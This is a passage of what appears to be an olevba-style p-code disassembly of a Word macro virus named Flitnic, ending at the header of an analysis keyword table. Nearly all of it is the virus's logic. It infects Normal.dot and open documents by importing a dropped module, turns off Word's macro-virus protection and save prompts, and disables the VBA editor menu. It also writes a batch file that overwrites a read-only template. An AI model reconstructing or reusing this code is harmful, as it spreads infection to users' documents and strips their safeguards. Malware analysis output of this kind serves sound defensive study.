' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St a 
' Line #146:
' 	Ld a 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #147:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo eb 
' 	EndIf 
' Line #148:
' 	Label eb 
' Line #149:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #150:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #151:
' 	LitVarSpecial (True)
' 	St ReInf 
' Line #152:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ReInf 
' 	EndIf 
' Line #153:
' 	Label Reinfection 
' Line #154:
' 	Ld ReInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #155:
' 	QuoteRem 0x0000 0x000C "Reinfection:"
' Line #156:
' 	LitDI2 0x0000 
' 	St Acd 
' Line #157:
' 	LitDI2 0x0000 
' 	St NormT 
' Line #158:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #159:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #160:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAt 
' Line #161:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #163:
' 	Label look 
' Line #164:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #165:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #166:
' 	Ld inn 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #167:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #168:
' 	Ld FullCodeN 
' 	Paren 
' 	Ld inn 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #169:
' 	LitDI2 0x0014 
' 	St i 
' Line #170:
' 	ExitFor 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #173:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #175:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #176:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #178:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #181:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #182:
' 	GoTo look 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #185:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #186:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #187:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #188:
' 	EndIfBlock 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	LitDI2 0x0001 
' 	St i 
' Line #191:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #192:
' 	Label notemp 
' Line #193:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #194:
' 	CloseAll 
' Line #195:
' 	Label look2 
' Line #196:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St a 
' Line #197:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo NoDocL 
' 	EndIf 
' Line #198:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #199:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #200:
' 	Ld inn2 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #201:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #202:
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #203:
' 	LitDI2 0x0014 
' 	St i 
' Line #204:
' 	ExitFor 
' Line #205:
' 	EndIfBlock 
' Line #206:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #207:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #209:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #210:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #212:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #214:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #215:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #216:
' 	GoTo look2 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #219:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #220:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #221:
' 	Label noactsave 
' Line #222:
' 	ElseBlock 
' Line #223:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #224:
' 	EndIfBlock 
' Line #225:
' 	EndIfBlock 
' Line #226:
' 	Label NoDocL 
' Line #227:
' 	ElseBlock 
' Line #228:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #229:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #230:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #231:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #232:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #233:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #234:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #235:
' 	EndIfBlock 
' Line #236:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt SaveNormalPrompt 
' Line #237:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #238:
' 	EndSub 
' Line #239:
' 	FuncDefn (Sub Flitnic())
' Line #240:
' 	Label Begin 
' Line #241:
' 	OnError eb 
' Line #242:
' 	SetStmt 
' 	Ld Options 
' 	Set opttt 
' Line #243:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set nmtmpl 
' Line #244:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set actdoche 
' Line #245:
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #246:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	Ld VBE 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #247:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #248:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #249:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt VirusProtection 
' Line #250:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt ConfirmConversions 
' Line #251:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt SaveNormalPrompt 
' Line #252:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #253:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #254:
' 	OnError NoInf 
' Line #255:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #256:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #257:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #258:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #259:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.3"
' 	Eq 
' 	IfBlock 
' Line #260:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #261:
' 	ExitFor 
' Line #262:
' 	EndIfBlock 
' Line #263:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #264:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #265:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #266:
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #267:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #268:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #269:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #270:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #271:
' 	EndIfBlock 
' Line #272:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #273:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #274:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #275:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #276:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.3"
' 	Eq 
' 	IfBlock 
' Line #277:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #278:
' 	ExitFor 
' Line #279:
' 	EndIfBlock 
' Line #280:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #281:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #282:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #283:
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #284:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #285:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #286:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #287:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #288:
' 	EndIfBlock 
' Line #289:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #290:
' 	Label look 
' Line #291:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #292:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #293:
' 	Ld inn 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #294:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #295:
' 	Ld FullCodeN 
' 	Paren 
' 	Ld inn 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #296:
' 	LitDI2 0x0014 
' 	St i 
' Line #297:
' 	ExitFor 
' Line #298:
' 	EndIfBlock 
' Line #299:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #300:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #301:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #302:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #303:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #304:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #305:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #306:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #307:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #308:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #309:
' 	GoTo look 
' Line #310:
' 	EndIfBlock 
' Line #311:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #312:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #313:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #314:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAtt 
' Line #315:
' 	LitStr 0x0000 ""
' 	St l 
' Line #316:
' 	OnError eb 
' Line #317:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #318:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #319:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #320:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #321:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #322:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #323:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #324:
' 	CloseAll 
' Line #325:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #326:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #327:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	FnLen 
' 	St l 
' Line #328:
' 	Ld l 
' 	LitDI2 0x000A 
' 	Sub 
' 	St l 
' Line #329:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x01F4 
' 	For 
' Line #330:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "rem Flitnic has cought you... he, he"
' 	PrintItemNL 
' Line #331:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #332:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #333:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Move /y "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #334:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "If exist c:\Troop.dat goto Begin"
' 	PrintItemNL 
' Line #335:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #336:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #337:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #338:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #339:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #340:
' 	EndIfBlock 
' Line #341:
' 	Label notemp 
' Line #342:
' 	EndIfBlock 
' Line #343:
' 	LitDI2 0x0001 
' 	St i 
' Line #344:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #345:
' 	CloseAll 
' Line #346:
' 	Label look2 
' Line #347:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #348:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #349:
' 	Ld inn2 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #350:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #351:
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #352:
' 	LitDI2 0x0014 
' 	St i 
' Line #353:
' 	ExitFor 
' Line #354:
' 	EndIfBlock 
' Line #355:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #356:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #357:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #358:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #359:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #360:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #361:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #362:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #363:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #364:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #365:
' 	GoTo look2 
' Line #366:
' 	EndIfBlock 
' Line #367:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #368:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #369:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #370:
' 	Label noactsave 
' Line #371:
' 	ElseBlock 
' Line #372:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #373:
' 	EndIfBlock 
' Line #374:
' 	EndIfBlock 
' Line #375:
' 	Label NoInf 
' Line #376:
' 	Label eb 
' Line #377:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #378:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #379:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #380:
' 	GoTo NoNormal 
' Line #381:
' 	EndIfBlock 
' Line #382:
' 	Ld NormAtt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #383:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #384:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #385:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #386:
' 	ElseBlock 
' Line #387:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #388:
' 	EndIfBlock 
' Line #389:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #390:
' 	QuoteRem 0x0000 0x0049 "The only real- stealth virus till 08. april 1999. Infects Normal.Dot when"
' Line #391:
' 	QuoteRem 0x0000 0x0042 "it's ReadOnly too (immediatly, the first time you load an infected"
' Line #392:
' 	QuoteRem 0x0000 0x0008 "Document"
' Line #393:
' 	QuoteRem 0x0000 0x003E "Written by Flitnic, member of [S o S] No Payload included yet!"
' Line #394:
' 	Label NoNormal 
' Line #395:
' 	EndSub 
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' Line #400:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
